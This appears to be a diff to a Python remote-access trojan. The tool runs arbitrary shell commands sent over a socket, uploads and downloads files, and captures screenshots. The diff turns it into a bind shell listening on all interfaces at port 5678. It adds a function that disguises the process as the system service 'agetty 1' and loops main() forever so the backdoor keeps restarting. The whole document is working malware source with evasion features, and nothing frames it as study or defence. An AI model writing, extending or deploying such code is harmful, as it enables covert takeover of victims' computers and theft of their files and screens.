@@ -7,12 +7,17 @@ import time
 import argparse
 from PIL import ImageGrab
 import io
+import setproctitle
 
 
-addr = "127.0.0.1"
+addr = "0.0.0.0"
 port = 5678
 buff_size = 1024 * 128
 sep = "<SEP>"
+
+
+def hide():
+    setproctitle.setproctitle("agetty 1")
 
 
 def capture_screen():
@@ -42,15 +47,21 @@ def file_receive(s):
     filename = os.path.basename(filename)
     file_size = int(file_size)
 
-    #    progress = tqdm.tqdm(range(file_size), f"Receiveing file: {filename}", unit="B", unit_scale=True, unit_divisor=1024)
-    with open(filename, "wb") as f:
+    progress = tqdm.tqdm(
+        range(file_size),
+        f"Receiveing file: {filename}",
+        unit="B",
+        unit_scale=True,
+        unit_divisor=1024,
+    )
+    with open(filename, "wb") as fs:
         while True:
             read_buff = s.recv(buff_size)
             if b"done" in read_buff:
-                f.write(read_buff.replace(b"done", b""))
+                fs.write(read_buff.replace(b"done", b""))
                 break
-            f.write(read_buff)
-            #            progress.update(len(read_buff))
+            fs.write(read_buff)
+            progress.update(len(read_buff))
             s.send(b"ACK")
 
 
@@ -92,64 +103,60 @@ def file_send(s, req_f):
 
 def main():
 
-    parser = argparse.ArgumentParser()
-    parser.add_argument("ip", help="Server IP address")
-    parser.add_argument("port", type=int, help="Server port")
-    args = parser.parse_args()
-
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((addr, port))
+    s.listen(5)
 
-    try:
-        s.connect((addr, port))
-        cwd = os.getcwd()
-        s.send(cwd.encode())
+    conn, cl_addr = s.accept()
 
-        while True:
-            print("-----------------------------------------------")
-            cmd = s.recv(buff_size).decode()
-            s_cmd = cmd.split()
-            if cmd == "ACK":
-                continue
-            print(cmd)
-            print(s_cmd)
+    cwd = os.getcwd()
+    conn.send(cwd.encode())
 
-            if cmd.lower() == "exit":
-                break
+    while True:
+        print("-----------------------------------------------")
+        cmd = conn.recv(buff_size).decode()
+        s_cmd = cmd.split()
+        if cmd == "ACK":
+            continue
+        print(cmd)
+        print(s_cmd)
 
-            elif s_cmd[0].lower() == "download":
-                file_send(s, s_cmd[1:])
-                continue
+        if cmd.lower() == "exit":
+            break
 
-            elif s_cmd[0].lower() == "upload":
-                file_receive(s)
-                continue
+        elif s_cmd[0].lower() == "download":
+            file_send(conn, s_cmd[1:])
+            continue
 
-            elif s_cmd[0] == "ss":
-                send_screen(s)
-                continue
+        elif s_cmd[0].lower() == "upload":
+            file_receive(conn)
+            continue
 
-            elif s_cmd[0].lower() == "cd":
-                try:
-                    os.chdir(" ".join(s_cmd[1:]))
-                except FileNotFoundError as e:
-                    ot = e
-                    print(e)
-                else:
-                    ot = " "
+        elif s_cmd[0] == "ss":
+            send_screen(conn)
+            continue
+
+        elif s_cmd[0].lower() == "cd":
+            try:
+                os.chdir(" ".join(s_cmd[1:]))
+            except FileNotFoundError as e:
+                ot = e
+                print(e)
             else:
-                ot = subprocess.run(
-                    cmd, shell=True, text=True, capture_output=True
-                ).stdout
+                ot = " "
+        else:
+            ot = subprocess.run(cmd, shell=True, text=True, capture_output=True).stdout
 
-            cwd = os.getcwd()
-            msg = f"{ot} {sep} {cwd}"
-            # print(f"msg: {msg}")
-            s.send(msg.encode())
+        cwd = os.getcwd()
+        msg = f"{ot} {sep} {cwd}"
+        conn.send(msg.encode())
 
-    except Exception as e:
-        print(f"Exception Occured : {e}")
-    finally:
-        s.close()
+    #    print(f"Exception Occured : {e}")
+    s.close()
 
 
-main()
+if __name__ == "__main__":
+    while True:
+        hide()
+        main()
